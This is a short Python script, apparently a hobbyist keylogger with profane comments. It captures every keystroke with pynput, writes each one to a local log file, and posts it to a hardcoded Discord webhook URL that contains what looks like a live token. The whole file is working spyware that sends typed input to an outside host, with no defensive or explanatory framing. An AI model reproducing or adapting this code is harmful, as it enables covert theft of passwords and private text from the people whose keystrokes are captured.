from pynput.keyboard import Key, Listener
import requests
import logging

WEBHOOK_URL = "https://discord.com/api/webhooks/1350200069684592640/D3UPLxpUVG8U0N8U4lANBrEm013XrV_6Y2UPzG6dXJoBHEqCHB8SOMwvIaEz-H9h9CEO" # simply I don't care 
# WHY LOG VARIABLE YOU MAY ASK BECAUSE I WAS TRYING TO FIX SOMETHING AND IT DIDN'T WORK SO I'M NOT CHANGING NOW 
log = logging.basicConfig(filename="key_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
# TODO FOR ME IF I FEEL MOTIVATED THIS FUCK THINGS OR SOMEONE ELSE PLEASE FIX THE DATE AND TIME OR WHATEVER FUCK YOU WANT TO CALL IT
    
def send_key_to_discord(key):
      key = str(key).replace("'", "") 
      logging.info(f"Key Pressed: {key}") 
      # DON'T MOVE THIS IT MAY PISS THE CODE OFF
      payload = {"content": f"🔹 **Key Pressed:** `{key}`"}
      requests.post(WEBHOOK_URL, json=payload)
      
try: # THIS TOOK AN HOUR TO FIGURE OUT FUCK ME
    with Listener(on_press=send_key_to_discord) as listener:
      listener.join()

# WE NEED THIS  
except KeyboardInterrupt:
   print("FUCK")





  
